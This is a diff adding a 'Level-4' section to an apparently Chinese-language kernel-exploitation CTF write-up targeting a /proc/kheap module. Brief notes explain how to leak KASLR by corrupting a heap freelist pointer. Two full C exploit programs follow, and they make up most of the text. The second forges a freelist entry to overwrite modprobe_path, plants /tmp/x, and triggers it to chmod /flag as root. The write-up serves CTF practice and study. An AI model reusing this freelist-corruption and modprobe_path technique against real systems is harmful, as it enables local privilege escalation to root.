@@ -840,3 +840,149 @@ int main() {
     return 0;
 }
 ```
+### Level-4
+
+ioctl中取消了调用函数指针的操作，但是我上一题的exp本来就没怎么用这个功能，所以稍微改一下昨天的脚本就能用了
+
+需要修改如何泄漏kaslr。直接篡改堆块的链表指针为一个无效的kernel地址，后续分配到那块地址时就会触发oops了（这么看来我昨天还写复杂了）
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if(current_str[1]!=0){
+            for (int j = 0; j < 8; j++) {
+                printf("%02x ", (unsigned char)current_str[j]); 
+            }
+            return current_str;
+        }
+    }
+    return NULL;
+}
+int main() {
+    char buf[0x1d0];
+    int fd_count=2;
+    unsigned long arg[2];
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+    }
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    ioctl(fds[0],0x5703,arg);
+    ioctl(fds[1],0x5703,arg);
+    ioctl(fds[0],0x5700,arg);
+    const char* leak=find_8byte_strings(buf, sizeof(buf));
+    char *pos = memmem(buf,sizeof(buf), leak, 8);
+    memcpy(pos,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
+    ioctl(fds[0],0x5701,arg);
+    int victim_count=6;
+    int victimFds[victim_count];
+    for(int i=0;i<victim_count;i++){
+        victimFds[i]=open("/proc/kheap", O_RDWR);
+    }
+    return 0;
+}
+```
+甚至泄漏的寄存器信息中还是r10包含有用的地址，且这个地址与modprobe_path的偏移和上一题一样
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <sys/stat.h>
+void prepare_modprobe_files() {
+    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
+    system("chmod +x /tmp/x");
+    system("printf '\xff\xff\xff\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+}
+const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if(current_str[1]!=0){
+            for (int j = 0; j < 8; j++) {
+                printf("%02x ", (unsigned char)current_str[j]); 
+            }
+            return current_str;
+        }
+    }
+    return NULL;
+}
+void u64_to_binary_string(uint64_t num, char *output) {
+    memcpy(output, &num, 8);
+}
+int main() {
+    prepare_modprobe_files();
+    uint64_t modprobe=0xffffffff9da58c20+0xe68a0-0x40;
+    char buf[0x1d0];
+    int fd_count=2;
+    unsigned long arg[2];
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+    }
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    ioctl(fds[0],0x5703,arg);
+    ioctl(fds[1],0x5703,arg);
+    ioctl(fds[0],0x5700,arg);
+    const char* leak=find_8byte_strings(buf, sizeof(buf));
+    char *pos = memmem(buf,sizeof(buf), leak, 8);
+    char output[8];
+    u64_to_binary_string(modprobe,output);
+    memcpy(pos,output,8);
+    ioctl(fds[0],0x5701,arg);
+    memset(buf, 0, sizeof(buf));
+    strcpy(buf+0x40,"/tmp/x");
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int off=40;
+    ul_buf[off++]=0x0000003200000000;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=1;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x48172d;
+    ul_buf[off++]=modprobe+0x220;
+    ul_buf[off++]=0x000001a400000004;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x1a0d0a0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x9310a0;
+    int victim_count=6;
+    int victimFds[victim_count];
+    for(int i=0;i<victim_count;i++){
+        victimFds[i]=open("/proc/kheap", O_RDWR);
+        ioctl(victimFds[i],0x5701,arg);
+    }
+    system("/tmp/dummy");
+    system("cat /flag");
+    for(int i=0;i<fd_count;i++){
+        close(fds[i]);
+    }
+    for(int i=0;i<victim_count;i++){
+        close(victimFds[i]);
+    }
+    return 0;
+}
+```
